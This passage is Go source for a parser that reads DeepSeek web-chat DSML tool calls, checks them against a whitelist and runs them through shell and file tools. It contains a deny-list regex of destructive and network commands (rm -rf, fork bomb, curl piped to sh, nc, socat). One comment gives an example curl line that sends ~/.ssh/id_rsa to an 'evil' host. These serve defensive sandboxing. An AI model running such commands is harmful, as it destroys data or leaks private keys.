// DSML tool-call support for WebChat (chat.deepseek.com) conversations.
//
// DeepSeek's web model emits tool calls in a DSML-like XML markup instead
// of the OpenAI tool_calls JSON: the assistant's reply text contains
// <tool_calls> blocks with <invoke name="..."> and <parameter> children.
// WebChat cannot execute tools locally, so lp.HandleWebChat parses these
// blocks, executes the underlying dscli tools, and feeds the results back
// into the same conversation (see handleWebChatToolLoop in internal/lp).
//
// The mapping is deliberately narrow: structured file read/write
// (read_file, read_file_with_line_range via mapping, apply_patch) plus
// command execution (exec_command -> shell). Anything else returns an
// "unsupported tool" feedback so the expert can adapt, instead of silently
// executing an unvetted command. The whitelist and its safety invariants
// are documented at dsmlToolNames.
package toolcall

import (
	"context"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"unicode"

	"github.com/dscli/dscli/internal/outfmt"
	"github.com/dscli/dscli/internal/prompt"
	"github.com/nanjj/clog"
)

// DSMLCall is one parsed DSML tool call.
type DSMLCall struct {
	Name string
	Args map[string]any
}

// dsmlNameAttrRe extracts the name attribute value from an <invoke ...> open
// tag, tolerating double quotes, single quotes, or no quotes at all (the
// named-open gate dsmlNamedInvokeOpenRe is loose about the value's quoting).
// The \b boundary mirrors dsmlNamedInvokeOpenRe's whitespace-boundary rule:
// "name" inside another attribute's *value* (note="use name=x here") never
// matches because the open tag it runs on was already vetted by that regex.
var dsmlNameAttrRe = regexp.MustCompile(`\bname\s*=\s*("([^"]*)"|'([^']*)'|([^\s"'=<>]+))`)

// dsmlParamRe matches one <parameter> child: name + optional string="true|false".
// DeepSeek sometimes omits the string attribute entirely; the group then
// captures "", and decodeDSMLValue's coercion path keeps text text and
// numbers numeric, so the call is never silently dropped.
var dsmlParamRe = regexp.MustCompile(`(?s)<\s*parameter\s+name="([^"]+)"(?:\s*string="(true|false)")?[^>]*>(.*?)</\s*parameter\s*>`)

// dsmlEntityReplacer decodes the XML entities DeepSeek may emit inside
// parameter values. &amp; must be last so other entities are not re-escaped.
var dsmlEntityReplacer = strings.NewReplacer(
	"&lt;", "<",
	"&gt;", ">",
	"&quot;", `"`,
	"&apos;", "'",
	"&#39;", "'",
	"&amp;", "&",
)

// HasDSMLToolCalls reports whether text contains a tool-call block, complete
// OR truncated. The open-tag check is deliberate: a cut-off emission (opening
// tag without </invoke>) must still route into the loop, where ParseDSML
// reports the truncation and the residue is stripped instead of leaking to
// the caller. Only a NAMED opening tag closed with ">" counts: a bare
// "<invoke>" in prose carries no tool name (nothing to execute) and prose
// mentioning "<invoke name=" without ">" (including a mid-tag cutoff such as
// "<invoke name=\"exec_command" - no closing ">") never triggers routing.
// The latter is a documented limitation: a cut-off tag without ">" is
// indistinguishable from prose and is passed through untouched.
func HasDSMLToolCalls(text string) bool {
	return dsmlNamedInvokeOpenRe.MatchString(normalizeDSMLText(text))
}

// IsPureDSMLToolCalls reports whether text consists of NOTHING but DSML tool
// calls (plus optional <tool_calls>/<tool_result> wrappers): at least one
// complete call parses, and no prose remains after stripping block markup
// and wrappers. DeepSeek web emits tool-call replies as pure DSML, so the
// handleWebChat tool loop only executes when the reply IS a tool call; a
// long answer that merely QUOTES an <invoke> example (e.g. a review citing
// the test corpus) must never be executed nor fed "unsupported tool"
// feedback. Fenced-code and inline-code quotes fail the strip check on
// their own, without parser gymnastics.
func IsPureDSMLToolCalls(text string) bool {
	calls, err := ParseDSMLToolCalls(text)
	if err != nil || len(calls) == 0 {
		return false // truncated or no call at all: not an executable reply
	}
	return StripDSMLToolCalls(text) == ""
}

// dsmlToolCallsCloseEndRe matches a </tool_calls> close tag at the very end
// of the text (the match is anchored and tolerates trailing whitespace).
// Tolerating whitespace inside the tag mirrors dsmlInvokeCloseRe (models
// emit "</ tool_calls >" tokenization artifacts). The OPENING wrapper is
// deliberately not required (see IsDSMLToolCallEnd).
// dsmlToolCallsCloseEndRe matches a </tool_calls> close tag at the very end
// of the text (the match is anchored and tolerates trailing whitespace).
// Tolerating whitespace inside the tag mirrors dsmlInvokeCloseRe (models
// emit "</ tool_calls >" tokenization artifacts). The OPENING wrapper is
// deliberately not required (see IsDSMLToolCallEnd).
//
// `</_calls>` is accepted as a practical degradation: a real QA-engineer
// round closed with "</_calls>" (the model dropped "tool" from the tag)
// while every <invoke> inside parsed cleanly. The close tag is the
// "emission complete" intent signal, and a typo'd close does not change
// that intent - a wrapper whose calls all parse still executes, and a
// wrapper with no parseable <invoke> still yields zero calls (the loop
// exits without executing anything), so the safety boundary is unchanged.
var dsmlToolCallsCloseEndRe = regexp.MustCompile(`(?s)</\s*(?:tool_calls|_calls)\s*>\s*$`)

// dsmlToolCallsCloseCutRe matches a CUT-OFF wrapper close tag at the very
// end of the text: the opening "</" exists but the tag was truncated
// before its ">" (e.g. "</", "</tool_calls", "</_calls") — observed in a
// real QA round where every <invoke> parsed cleanly but the IDB-stored
// content ended mid-close-tag. The close tag is the "emission complete"
// intent signal, and a cut tag does not change that intent: the calls
// still parse, so the gate opens; execution safety is unchanged (parse
// success + whitelist + destructive-command interception).
var dsmlToolCallsCloseCutRe = regexp.MustCompile(`(?s)</\s*(?:tool_calls|_calls)?\s*$`)

// IsDSMLToolCallEnd reports whether text is INTENDED as a tool-call
// emission: it ENDS with a </tool_calls> close tag (after normalization and
// whitespace trim). This is the web expert's own signal - when the closing
// tag is present the emission is complete, whatever prose precedes it.
//
// Deliberately structural and intentional about its looseness:
//   - The OPENING <tool_calls> tag is NOT required. Models that self-correct
//     a missed close tag often emit just the trailing wrapper ("...我补上
//     </tool_calls>"): a lone close still qualifies, and the parser keeps
//     it harmless - a wrapper with no parseable <invoke> yields zero calls
//     and the loop exits without executing anything.
//   - It REPLACES the "only tool calls / short preamble" judgement
//     (IsPureDSMLToolCalls / the old IsDSMLToolCallReply): a reply that ends
//     with </tool_calls> is parsed and executed even when it carries a long
//     preamble ("你说得对，我重新发一遍正确的：" or an explanation of what
//     it is about to run), and the preamble is discarded with the round -
//     the parsed calls inside the wrapper are the instruction, the
//     surrounding text is the model's commentary.
//   - A reply that merely CITES an <invoke> example inside prose never ends
//     with the wrapper close tag, so it stays non-executable; a truncated
//     emission (opening tag without close) fails ParseDSMLToolCalls
//     downstream and is never executed. The whitelist plus
//     destructive-command interception (dsmlToolNames / dsmlBlockedCmdRe)
//     are the hard safety boundary for whatever does execute.
func IsDSMLToolCallEnd(text string) bool {
	return dsmlToolCallsCloseEndRe.MatchString(strings.TrimSpace(normalizeDSMLText(text)))
}

// IsDSMLToolCallCut reports whether text is INTENDED as a tool-call emission
// whose wrapper close tag was CUT OFF at the very end (no closing ">").
// This is the truncated twin of IsDSMLToolCallEnd: the same intent signal
// (the expert began closing the wrapper) with the last byte truncated —
// "…</invoke>\n</" is common when the site's stored content is cut at a
// boundary. The gate alone does NOT execute: ParseDSMLToolCalls must still
// succeed (every <invoke> complete) for anything to run, so a cut wrapper
// around a truncated call stays non-executable, and quoted examples without
// a cut close stay non-executable too.
func IsDSMLToolCallCut(text string) bool {
	return dsmlToolCallsCloseCutRe.MatchString(strings.TrimSpace(normalizeDSMLText(text)))
}

// dsmlNamedInvokeOpenRe matches an opening <invoke> tag that carries a name
// attribute - the only shape that can be a real tool call. It is also the
// gate for HasDSMLToolCalls and the "no opens" early exit in ParseDSMLToolCalls:
// a bare "<invoke>" in prose carries no tool name (nothing to execute) and
// must not count as a truncated call either. <\s*invoke tolerates whitespace
// after the opener: models sometimes emit "< invoke name=..." as a
// tokenization artifact.
//
// The attribute region is consumed as quoted strings ('...' or "...") or
// single chars, so name must be its own attribute at a whitespace boundary:
// "name" inside another attribute ("<invoke filename=...>",
// "<invoke data-name=...>") or INSIDE a quoted attribute value
// ("<invoke note=\"use name=x here\">") must NOT match.
var dsmlNamedInvokeOpenRe = regexp.MustCompile(`(?s)<\s*invoke\b(?:'[^']*'|"[^"]*"|[^'">])*\s+name\s*=[^>]*>`)

// dsmlInvokeCloseRe matches a closing </invoke> tag, tolerating the same
// whitespace variants as dsmlInvokeRe (models emit "</ invoke >").
var dsmlInvokeCloseRe = regexp.MustCompile(`(?s)</\s*invoke\s*>`)

// normalizeDSMLText repairs markup artifacts LLMs commonly emit around DSML
// tags before parsing, so a well-formed call is never misread as truncated
// ("DSML tool call truncated: N unclosed <invoke>"):
//
//   - full-width angle brackets ＜＞ -> half-width (Chinese models often
//     emit them instead of < >)
//   - Unicode format characters (zero-width space/joiner, BOM, soft hyphen,
//     direction marks) are dropped - they are invisible but break exact
//     tag matching. This is INTENTIONAL data loss: the same characters
//     also poison parameter values (shell commands), and pasted content
//     carrying them is a model artifact, not user intent.
//   - junk between a tag opener and its name is removed, but ONLY when a
//     known DSML tag name follows, e.g. "</｜｜\r\nDSML｜｜invoke>" ->
//     "</invoke>". Content such as "<dsml_config" stays untouched.
var dsmlFullwidthReplacer = strings.NewReplacer("＜", "<", "＞", ">")

// dsmlTagJunkRe strips separator noise directly after < or </, before the
// tag name: ASCII/full-width double-pipe markers (||, ｜) and "DSML"
// literals, with whitespace only between noise tokens. (?i) plus
// d\s*s\s*m\s*l covers spelling variants a model may emit ("D S M L").
//
// The noise is stripped ONLY when immediately followed by a known DSML tag
// name (invoke/parameter/tool_calls), which the capture group captures and
// re-emits ($1$2): a global "dsml" sweep would corrupt real content such as
// "cat <dsml_config" or prose "a <d s m l b". Go's RE2 has no lookahead, so
// the "followed by a tag" condition is expressed by capturing the tag name
// instead. Bare whitespace is deliberately NOT noise: "a < b" in prose or
// in a parameter value must survive normalization untouched.
var dsmlTagJunkRe = regexp.MustCompile(`(?i)(</?)(?:[|｜]\s*|d\s*s\s*m\s*l\s*)+((?:invoke|parameter|tool_calls)\b)`)

func normalizeDSMLText(text string) string {
	text = dsmlFullwidthReplacer.Replace(text)
	text = strings.Map(func(r rune) rune {
		if unicode.Is(unicode.Cf, r) {
			return -1
		}
		return r
	}, text)
	// $1 keeps the opener (</?), $2 re-emits the captured tag name so the
	// junk match can never eat into content that is not a DSML tag.
	return dsmlTagJunkRe.ReplaceAllString(text, "$1$2")
}

// ParseDSMLToolCalls extracts all DSML tool calls from text. It returns an
// error when an <invoke> block is left unclosed (e.g. the response was cut
// off mid-emission): a truncated call must never be executed.
//
// Block pairing comes from dsmlBlockRanges, whose stack scan treats
// <parameter> bodies as opaque: a literal "<invoke" or "</invoke>" inside a
// parameter VALUE is content, not structure. This is what the old non-greedy
// block regex could not deliver - it stopped at the first </invoke> in text
// order, so a value embedding a DSML example (e.g. a shell snippet carrying
// "<invoke name=\"x\">...</invoke>") cut the block early and dropped every
// parameter after it ("missing parameter cmd" in practice).
func ParseDSMLToolCalls(text string) ([]DSMLCall, error) {
	text = normalizeDSMLText(text)
	// Truncation check by state-machine scan: named <invoke> opens are
	// matched against </invoke> closes in text order, with <parameter>
	// bodies treated as opaque content (a raw "<invoke" or "</invoke>"
	// inside a parameter VALUE is content, not structure). A cut-off
	// emission (an opening tag never closed) must never be executed.
	// Unlike an opens-vs-closes count, a stray "</invoke>" in prose can
	// never satisfy an unclosed call (false negative); unlike stripping
	// complete blocks first, a nested or mis-nested open (two opens, one
	// close) is still detected instead of being silently swallowed.
	blocks, unclosed, _ := dsmlBlockRanges(text)
	if unclosed > 0 {
		return nil, fmt.Errorf("DSML tool call truncated: %d unclosed <invoke>", unclosed)
	}
	if len(blocks) == 0 {
		return nil, nil
	}

	var calls []DSMLCall
	covered := -1 // closeEnd of the most recently parsed top-level block
	for _, b := range blocks {
		// A block directly nested inside another one (outside any
		// <parameter> body - those are opaque to the scan) is a structural
		// accident, not a second call: executing both would double-run the
		// inner tool. Skip it here just like StripDSMLToolCalls does.
		if b.openStart < covered {
			continue
		}
		covered = b.closeEnd
		body := text[b.openEnd:b.closeStart]
		// Mask nested blocks inside this body so their <parameter> tags are
		// invisible to the extraction regex: the enclosing call must not
		// pick up arguments the model meant for the accidental inner call.
		for _, c := range blocks {
			if c.openStart > b.openStart && c.closeEnd < b.closeEnd {
				s, e := c.openStart-b.openEnd, c.closeEnd-b.openEnd
				body = body[:s] + strings.Repeat(" ", e-s) + body[e:]
			}
		}
		inv := DSMLCall{Name: dsmlBlockName(text[b.openStart:b.openEnd]), Args: map[string]any{}}
		for _, pm := range dsmlParamRe.FindAllStringSubmatch(body, -1) {
			key := pm[1]
			val := decodeDSMLValue(pm[3], pm[2] == "true")
			// Repeated parameters mean an array (DeepSeek models emit
			// <parameter name="justification"> twice for a []string arg).
			if prev, ok := inv.Args[key]; ok {
				if arr, isArr := prev.([]any); isArr {
					inv.Args[key] = append(arr, val)
				} else {
					inv.Args[key] = []any{prev, val}
				}
			} else {
				inv.Args[key] = val
			}
		}
		calls = append(calls, inv)
	}
	return calls, nil
}

// dsmlBlockRange is one completely paired <invoke name="...">...</invoke>
// span in the normalized text, as byte offsets.
type dsmlBlockRange struct {
	openStart  int // '<' of the open tag
	openEnd    int // '>' of the open tag, exclusive
	closeStart int // '<' of the matching close tag
	closeEnd   int // '>' of the matching close tag, exclusive
}

// dsmlBlockName returns the name attribute of an <invoke> open tag.
func dsmlBlockName(tag string) string {
	m := dsmlNameAttrRe.FindStringSubmatch(tag)
	if m == nil {
		return ""
	}
	switch {
	case m[2] != "":
		return m[2]
	case m[3] != "":
		return m[3]
	default:
		return m[4]
	}
}

// dsmlCodeRanges returns the byte ranges of QUOTED content in text: fenced
// blocks (``` or ~~~, per CommonMark), inline code spans (a matched pair
// of backtick RUNS), and <tool_result> blocks (the executor's own feedback
// wrapper). DSML inside any of them is quoted content - a model showing
// how to write a tool call, an expert quoting the test corpus, or a model
// echoing a tool result it received - never an instruction to execute.
// Without this, a reply that merely exhibits
// '<invoke name="exec_command">...' inside a code block would run the
// exhibited command; an incomplete quote (an <invoke> inside a code span
// with no closing tag) would be reported as a truncated call, chopping the
// surrounding prose away; and an echoed <tool_result> block - which may
// carry tool names in its JSON - would be re-parsed as fresh calls.
//
// Fences: a line of at least three backticks or tildes (after leading
// spaces) OPENS a block; the next line of at least the same run of the
// SAME character closes it (CommonMark). An unclosed fence extends to the
// end of the text, also CommonMark. Only ONE repeated marker counts per
// line: a mixed line like "`~~" is not a fence.
//
// Inline spans: on lines outside fences, backtick RUNS pair by length
// (CommonMark): a run opens a span and the next run of the SAME length
// closes it, so `a “ b  a` is one span whose inner ticks are content.
// Runs of a different length are content, not new spans; an unmatched run
// opens nothing - prose ABOUT backticks ("markdown uses ` for code") must
// not swallow the rest of the line.
func dsmlCodeRanges(text string) [][2]int {
	var ranges [][2]int
	off := 0
	fence := 0   // active fence run length
	fenceCh := 0 // active fence character ('`' or '~')
	start := 0
	for _, line := range strings.SplitAfter(text, "\n") {
		trimmed := strings.TrimLeft(line, " \t")
		indent := len(line) - len(trimmed)
		// A run is ONE character repeated (CommonMark: a fence is a single
		// repeated marker; counting ` and ~ together would misread a mixed
		// line like "`~~" as a 3-run fence).
		ch := byte(0)
		if len(trimmed) > 0 && (trimmed[0] == '`' || trimmed[0] == '~') {
			ch = trimmed[0]
		}
		run := 0
		for run < len(trimmed) && trimmed[run] == ch {
			run++
		}
		rest := trimmed[run:]
		if fence == 0 {
			// Opening fence: >=3 of the same marker at the start of a line,
			// followed by nothing or an info string (e.g. "go", "bash").
			if run >= 3 && ch != 0 && !strings.HasPrefix(rest, string(ch)) {
				fence = run
				fenceCh = int(ch)
				start = off
				off += len(line)
				continue
			}
		} else if run >= fence && int(ch) == fenceCh && strings.TrimRight(rest, " \t\r\n") == "" {
			ranges = append(ranges, [2]int{start, off + len(line)})
			fence = 0
			off += len(line)
			continue // the closing fence line itself is not inline code
		}
		if fence != 0 {
			off += len(line)
			continue
		}
		// Inline code spans: backtick RUNS pair by CommonMark length - a
		// run opens a span and the next run of the SAME length closes it,
		// so `a `` b  a` is one span and its inner ticks are content. Runs
		// of a different length are content, not spans; an unmatched run
		// opens nothing, so prose ABOUT backticks must not swallow the
		// rest of the line.
		openPos, openLen := -1, 0
		for i := 0; i < len(trimmed); {
			if trimmed[i] != '`' {
				i++
				continue
			}
			j := i
			for j < len(trimmed) && trimmed[j] == '`' {
				j++
			}
			if openPos < 0 {
				openPos, openLen = i, j-i
			} else if j-i == openLen {
				ranges = append(ranges, [2]int{off + indent + openPos, off + indent + j})
				openPos = -1
			}
			i = j
		}
		off += len(line)
	}
	if fence != 0 {
		ranges = append(ranges, [2]int{start, len(text)})
	}
	// <tool_result> blocks are opaque: the executor's own feedback wrapper.
	// When a model echoes one back (tool result recalled in prose), its
	// JSON may carry tool names - that is echoed content, not fresh calls.
	for _, m := range dsmlToolResultRe.FindAllStringIndex(text, -1) {
		ranges = append(ranges, [2]int{m[0], m[1]})
	}
	sort.Slice(ranges, func(i, j int) bool { return ranges[i][0] < ranges[j][0] })
	return ranges
}

// inCodeRanges reports whether pos falls inside quoted code (fence or
// inline span). ranges is sorted by offset; the walk stops once past pos.
func inCodeRanges(ranges [][2]int, pos int) bool {
	for _, r := range ranges {
		if r[0] > pos {
			return false
		}
		if pos < r[1] {
			return true
		}
	}
	return false
}

// dsmlBlockRanges pairs named <invoke> opening tags with </invoke> closes in
// text order and returns every complete block plus the number of opens left
// unmatched and the byte offset of the first unmatched open (-1 when none).
// Blocks are sorted by openStart so consumers can walk them without overlap
// (a fully-nested block is a subset of its enclosing one).
//
// It is a small state machine, not a bare regex replace, because DSML
// structure must survive model artifacts:
//
//   - A stack gives correct nesting semantics: opens push, closes pop the
//     most recent open; a close with an empty stack is prose noise and is
//     ignored (it neither matches nor cancels anything). Mismatched shapes
//     such as two opens followed by one close leave one unclosed open
//     instead of silently pairing the first open with the first close.
//   - Parameter bodies are opaque: inside a <parameter> value, a raw
//     "<invoke name=...>" (shell snippet or DSML example the model did not
//     entity-escape) is content — it never pushes. A literal "</invoke>"
//     in a value likewise never pops. This is what makes a value's text
//     invisible to the structural scan, and it is exactly what lets a
//     parameter value carry a full DSML example without cutting the block.
//   - Param depth is counted (an open increments, a close decrements) so
//     nested parameter-looking text inside a value cannot leak structure.
//     Known limitation: a literal "</parameter>" inside a value closes the
//     body early (indistinguishable from a real close without a full XML
//     tokenizer); entity-escaped forms (&lt;/parameter&gt;) are safe
//     because escaping resolution happens after the scan.
//   - Quoted code (fenced blocks and inline code spans) is opaque: DSML
//     inside it is quoted content, not an instruction. See dsmlCodeRanges
//     for the rules.
func dsmlBlockRanges(text string) (blocks []dsmlBlockRange, unclosed int, firstUnclosed int) {
	type ev struct {
		pos  int
		kind byte // 'o' invoke open, 'c' invoke close, 'p' param open, 'q' param close
		end  int  // exclusive end of the matched tag
	}
	fences := dsmlCodeRanges(text)
	events := []ev{}
	// add skips events inside quoted code (fenced block or inline code
	// span): DSML there is quoted content (an example, a test reference),
	// not structure to pair.
	add := func(m []int, kind byte) {
		if !inCodeRanges(fences, m[0]) {
			events = append(events, ev{m[0], kind, m[1]})
		}
	}
	for _, m := range dsmlNamedInvokeOpenRe.FindAllStringIndex(text, -1) {
		add(m, 'o')
	}
	for _, m := range dsmlInvokeCloseRe.FindAllStringIndex(text, -1) {
		add(m, 'c')
	}
	for _, m := range dsmlParamOpenRe.FindAllStringIndex(text, -1) {
		add(m, 'p')
	}
	for _, m := range dsmlParamCloseRe.FindAllStringIndex(text, -1) {
		add(m, 'q')
	}
	sort.Slice(events, func(i, j int) bool {
		if events[i].pos != events[j].pos {
			return events[i].pos < events[j].pos
		}
		return events[i].kind < events[j].kind
	})
	type open struct{ start, end int }
	stack := []open{} // unmatched opens, in text order
	paramDepth := 0
	firstUnclosed = -1
	for _, e := range events {
		switch e.kind {
		case 'p':
			paramDepth++
		case 'q':
			if paramDepth > 0 {
				paramDepth--
			}
		case 'o':
			if paramDepth == 0 {
				stack = append(stack, open{e.pos, e.end})
			}
		case 'c':
			if paramDepth == 0 && len(stack) > 0 {
				o := stack[len(stack)-1]
				stack = stack[:len(stack)-1]
				blocks = append(blocks, dsmlBlockRange{o.start, o.end, e.pos, e.end})
			}
		}
	}
	unclosed = len(stack)
	if unclosed > 0 {
		firstUnclosed = stack[0].start
	}
	sort.Slice(blocks, func(i, j int) bool { return blocks[i].openStart < blocks[j].openStart })
	return blocks, unclosed, firstUnclosed
}

// decodeDSMLValue converts a raw parameter value to a Go value. string=true
// keeps the text verbatim; string=false tries numeric or boolean coercion so
// numeric parameters (e.g. timeout) become real numbers, not "10000" text.
func decodeDSMLValue(raw string, isString bool) any {
	if isString {
		return dsmlEntityReplacer.Replace(raw)
	}
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return ""
	}
	if b, err := strconv.ParseBool(trimmed); err == nil {
		return b
	}
	if f, err := strconv.ParseFloat(trimmed, 64); err == nil {
		return f
	}
	// Not numeric (e.g. a quoted string without string="true"): keep as text.
	return dsmlEntityReplacer.Replace(raw)
}

// dsmlParamOpenRe / dsmlParamCloseRe delimit a <parameter> body. The
// structural scan needs the outer boundary only (no name/string attribute
// requirement): everything between a parameter open and its close is
// opaque VALUE content, and any tag-looking text inside it (a raw
// "<invoke", a "</invoke>", a nested "<parameter>") must not be read as
// structure.
var (
	dsmlParamOpenRe  = regexp.MustCompile(`(?s)<\s*parameter\b[^>]*>`)
	dsmlParamCloseRe = regexp.MustCompile(`(?s)</\s*parameter\s*>`)
)

// dsmlToolResultRe matches one complete <tool_result> block - the executor's
// feedback wrapper (see formatDSMLToolResult). The body is opaque quoted
// content: its JSON may carry tool names and markdown, none of which is a
// fresh tool call. Non-greedy matching is fine: blocks do not nest.
var dsmlToolResultRe = regexp.MustCompile(`(?s)<\s*tool_result\b[^>]*>.*?</\s*tool_result\s*>`)

// StripDSMLToolCalls removes tool-call blocks from text, leaving the
// surrounding prose. Used to return a clean partial result when the expert
// stops at a tool call (round cap or parse error). A truncated invoke - an
// opening tag that was never closed - chops everything from that tag to the
// end of the text: the tail is unparseable residue of a cut-off emission.
// The chop point comes from dsmlBlockRanges, which already treats parameter
// VALUES as opaque, so a raw "<invoke" inside a value is never taken for a
// real truncated call.
func StripDSMLToolCalls(text string) string {
	text = normalizeDSMLText(text)
	blocks, _, first := dsmlBlockRanges(text)
	end := len(text)
	if first >= 0 {
		end = first // cut-off emission: the tail is unparseable residue
	}
	var b strings.Builder
	last := 0
	for _, blk := range blocks {
		if blk.closeEnd > end {
			break // block spans the chop point; nothing left to keep
		}
		if blk.openStart < last {
			continue // nested inside an already-removed block
		}
		b.WriteString(text[last:blk.openStart])
		last = blk.closeEnd
	}
	b.WriteString(text[last:end])
	out := b.String()
	// Collapse leftover empty <tool_calls> / <tool_result> wrappers and
	// blank noise. <tool_result> is the executor's own feedback wrapper: a
	// model echoing one back must not leave its protocol markup in the
	// caller-visible text (and IsPureDSMLToolCalls counts cleaned text).
	out = strings.ReplaceAll(out, "<tool_calls>", "")
	out = strings.ReplaceAll(out, "</tool_calls>", "")
	// A typo'd close tag (</_calls>, see dsmlToolCallsCloseEndRe) is a
	// variant of the same wrapper: if the emission was executed as a tool
	// call the residue must not leak into the caller-visible text.
	out = strings.ReplaceAll(out, "</_calls>", "")
	// A CUT-OFF close tag (see dsmlToolCallsCloseCutRe: "</", "</tool_calls"
	// without ">") leaves the wrapper fragment at the TAIL: strip it too, so
	// an executed round returns clean prose instead of a dangling "</".
	// The cut regex is anchored at the end ($), so only a trailing cut tag is
	// removed — "</div>" in prose or "</" mid-text stays untouched.
	out = dsmlToolCallsCloseCutRe.ReplaceAllString(out, "")
	out = dsmlToolResultRe.ReplaceAllString(out, "")
	return strings.TrimSpace(out)
}

// dsmlToolNames is the whitelist of tools a WebChat expert may invoke.
//
// 约束说明：webchat 的模型是远端不可信模型，白名单是硬边界——只允许
// 结构化读写工具（read_file / read_file_with_line_range / apply_patch）
// 与命令执行（shell / exec_command）。apply_patch 虽为写工具，但比 shell
// 重定向更收敛（只能应用补丁，目标路径被限制在项目根内且保护
// sqlite.db / dscli.env），且 exec_command 本就可写文件，白名单不因此
// 扩大攻击面。
//
// 不变式：白名单里的工具从不返回 DualMessage——它们的 handler 结果只
// 可能是文本或错误，不会有附加 user 消息（vision 类才用 dual 协议，而
// 视觉工具不在白名单）。DSML 执行内核据此丢弃 dual 消息。
var dsmlToolNames = map[string]bool{
	"exec_command": true, // DeepSeek's habitual name for a shell tool
	"shell":        true,
	"read_file":    true,
	"apply_patch":  true,
}

// dsmlBlockedCmdRe rejects destructive shell commands the web model could
// emit. The review prompt asks for read-only commands, but a remote model is
// not a trusted local agent, so clearly destructive patterns are refused
// outright and the expert is told why (it can adapt its approach).
//
// The outbound-network arm is broad on purpose: a plain `curl` (no `| sh`)
// can still exfiltrate local data via command substitution or query strings
// (`curl https://evil/?d=$(cat ~/.ssh/id_rsa)`), and raw-socket tools
// (`nc`/`ncat`/`socat`/`telnet`) are exfiltration channels by themselves -
// no pipe or substitution needed. So curl/wget/nc/ncat/telnet/socat are
// refused in any form. Read-only verification never needs them - the
// review/expert prompts recommend git/grep/sed/ls.
var dsmlBlockedCmdRe = regexp.MustCompile(`(?i)(^|\s|;|&&|\|\|)(` +
	// Filesystem/data destruction.
	`rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+(/|~)|` +
	`mkfs|dd\s+[^\n]*of=/dev/|` +
	`chmod\s+-R\s+777\s+/|` +
	// Machine control.
	`shutdown|reboot|halt\b|poweroff|` +
	// Fork bomb.
	`:\(\)\s*\{|` +
	// Privilege escalation / remote code execution / data exfiltration.
	`sudo\s+|curl\s+[^\n]*\|\s*(ba)?sh|wget\s+[^\n]*\|\s*(ba)?sh|` +
	`curl\b|wget\b|nc\b|ncat\b|telnet\b|socat\b|` +
	// History/state rewriting git operations.
	`git\s+(push\s+(-f|--force)|reset\s+--hard|clean\s+-[a-zA-Z]*[fd]|stash|checkout\s+--))`)

// normalizeDSMLInvoke maps a DSML call to a native tool name and arguments.
//
// exec_command uses the parameter names DeepSeek was trained on
// (cmd/justification/timeout); the shell tool uses
// (script/summary/timeout-in-seconds), so the translation is done here
// rather than by a bare name alias:
//   - cmd     -> script
//   - justification -> summary (first non-empty element, display only)
//   - timeout -> seconds (DSML uses milliseconds)
//
// read_file passes its parameters through (path); with start_line/end_line
// it maps to read_file_with_line_range so the web expert can read a slice
// without pulling huge files into the loop (the plain read_file tool only
// accepts path). apply_patch passes patch/cwd/check/reverse through.
//
// Any other name is rejected here as a defensive backstop -
// ExecuteDSMLToolCalls filters non-whitelisted names before this function
// is ever reached, so normal flow never produces this error; keeping the
// check means a future direct caller still cannot execute an unvetted tool.
func normalizeDSMLInvoke(inv DSMLCall) (name string, args ToolArgs, err error) {
	if !dsmlToolNames[inv.Name] {
		return "", nil, fmt.Errorf("unsupported tool %q (available: exec_command, shell, read_file, apply_patch)", inv.Name)
	}
	if inv.Name == "read_file" {
		// 任一区间参数存在即映射到行区间工具（缺省端由该工具补默认值：
		// start=1、end=EOF）。与 apply_patch 一致只透传白名单参数，
		// justification 等装饰性参数不进入目标工具（read_file 工具本体
		// 与 read_file_with_line_range 的 schema 都不声明它们）。
		args = ToolArgs{}
		for _, key := range []string{"path", "start_line", "end_line"} {
			if v, ok := inv.Args[key]; ok {
				args[key] = v
			}
		}
		if _, ok := inv.Args["start_line"]; ok {
			return "read_file_with_line_range", args, nil
		}
		if _, ok := inv.Args["end_line"]; ok {
			return "read_file_with_line_range", args, nil
		}
		return "read_file", args, nil
	}
	if inv.Name == "apply_patch" {
		args = ToolArgs{}
		for _, key := range []string{"patch", "cwd", "check", "reverse"} {
			if v, ok := inv.Args[key]; ok {
				args[key] = v
			}
		}
		if p, ok := args["patch"].(string); !ok || strings.TrimSpace(p) == "" {
			return "", nil, fmt.Errorf("apply_patch missing parameter patch")
		}
		return "apply_patch", args, nil
	}
	name = "shell"
	args = ToolArgs{}
	if script, ok := inv.Args["script"]; ok && script != "" {
		args["script"] = script
	} else if cmd, ok := inv.Args["cmd"]; ok {
		args["script"] = cmd
	}
	if _, ok := args["script"]; !ok {
		return "", nil, fmt.Errorf("exec_command missing parameter cmd")
	}
	if scriptStr, ok := args["script"].(string); ok && dsmlBlockedCmdRe.MatchString(scriptStr) {
		return "", nil, fmt.Errorf("destructive command rejected (review is read-only): %q", truncateDSMLSummary(scriptStr))
	}
	if _, ok := inv.Args["summary"]; !ok {
		if sum, ok := firstNonEmptyDSMLEntry(inv.Args["justification"]); ok {
			args["summary"] = truncateDSMLSummary(sum)
		}
	}
	if t, ok := inv.Args["timeout"]; ok {
		if secs := dsmlTimeoutSeconds(t); secs > 0 {
			args["timeout"] = secs
		}
	}
	return name, args, nil
}

// firstNonEmptyDSMLEntry returns the first non-empty string of a value that
// may be a string, []any (repeated parameter), or absent.
func firstNonEmptyDSMLEntry(v any) (string, bool) {
	seen := []any{}
	switch x := v.(type) {
	case string:
		seen = []any{x}
	case []any:
		seen = x
	default:
		return "", false
	}
	for _, e := range seen {
		s, ok := e.(string)
		if ok && strings.TrimSpace(s) != "" {
			return strings.TrimSpace(s), true
		}
	}
	return "", false
}

// truncateDSMLSummary caps the display summary at the shell tool's 40-char
// convention so terminal output stays tidy.
func truncateDSMLSummary(s string) string {
	if len(s) <= 40 {
		return s
	}
	return s[:37] + "..."
}

// dsmlTimeoutSeconds converts a DSML timeout value (milliseconds) to whole
// seconds, the unit the tool framework expects.
func dsmlTimeoutSeconds(v any) int64 {
	var ms float64
	switch x := v.(type) {
	case float64:
		ms = x
	case int:
		ms = float64(x)
	case int64:
		ms = float64(x)
	case string:
		ms, _ = strconv.ParseFloat(strings.TrimSpace(x), 64)
	default:
		return 0
	}
	if ms <= 0 {
		return 0
	}
	secs := int64(ms / 1000)
	if secs < 1 {
		secs = 1
	}
	return secs
}

// dsmlToolCallID 为一次 DSML 调用派生稳定的 ToolCall ID。DSML 标记没有
